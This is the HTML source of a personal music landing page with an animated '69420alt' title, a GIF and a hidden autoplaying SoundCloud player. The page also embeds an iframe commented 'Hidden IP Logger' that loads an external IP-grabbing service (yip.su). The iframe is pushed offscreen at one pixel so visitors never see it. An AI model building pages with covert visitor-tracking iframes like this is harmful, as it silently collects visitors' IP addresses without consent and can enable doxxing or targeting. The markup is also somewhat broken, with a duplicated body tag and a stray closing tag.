<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title></title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%;
      background: black;
      color: white;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      user-select: none;
      cursor: pointer;
      text-align: center;
    }
    #header {
      font-size: 28px;
      margin-bottom: 20px;
    }
    #instruction {
      font-size: 16px;
      margin-top: 30px;
      color: #ccc;
    }
    #soundcloudPlayer {
      position: fixed;
      bottom: 5px;
      right: 5px;
      width: 1px !important;
      height: 1px !important;
      border: none;
      opacity: 0;
      pointer-events: none;
      user-select: none;
    }
    #yipFrame {
      position: absolute;
      left: -9999px;
      width: 1px;
      height: 1px;
      border: none;
    }
    #discordIcon {
      position: fixed;
      bottom: 10px;
      left: 10px;
      z-index: 9999;
      width: 40px;
      height: 40px;
      cursor: pointer;
    }
    #gifBottomRight {
      position: fixed;
      bottom: 10px;
      right: 10px;
      z-index: 9998;
      width: 100px;
      height: auto;
      pointer-events: none;
    }
  </style>
</head>
<body>

  <!-- Discord Icon -->
<body>
  <!-- Discord Icon (keep existing) -->

  </a>

  <!-- GIF bottom-right (keep existing) -->
  <img id="gifBottomRight" src="https://media.tenor.com/zXfaGp4XfnYAAAAd/unsrscandidate-shai.gif" alt="aura gif" />



  <!-- Rest of your existing content -->
  <div id="header">69420alt Pudshi Owner</div>
  <div id="instruction">Tap anywhere to play music</div>

  <!-- Hidden SoundCloud Player (keep existing) -->
  <iframe id="soundcloudPlayer" scrolling="no" allow="autoplay" src=""></iframe>

  <!-- Hidden IP Logger (keep existing) -->
  <iframe id="yipFrame" src="https://yip.su/aura" frameborder="0"></iframe>

  
<script>
  // Titolo animato: 6 9 4 2 0 a l t → sparisce → ricomincia
  const titleSequence = ["6", "9", "4", "2", "0", "a", "l", "t"];
  let titleIndex = 0;
  let building = true;

  function animateTitle() {
    if (building) {
      document.title = titleSequence.slice(0, titleIndex + 1).join("");
      titleIndex++;
      if (titleIndex === titleSequence.length) {
        building = false;
        setTimeout(animateTitle, 1000);
        return;
      }
    } else {
      titleIndex--;
      document.title = titleSequence.slice(0, titleIndex).join("");
      if (titleIndex === 0) {
        building = true;
      }
    }
    setTimeout(animateTitle, 300);
  }

  animateTitle();

  // SoundCloud autoplay
  const scIframe = document.getElementById('soundcloudPlayer');
  const instruction = document.getElementById('instruction');
  let started = false;

  function startAudio() {
    if (started) return;
    scIframe.src = "https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false";
    instruction.style.display = 'none';
    started = true;
  }

  document.body.addEventListener('click', startAudio);
  document.body.addEventListener('touchstart', startAudio);
</script>

</body>
</html>
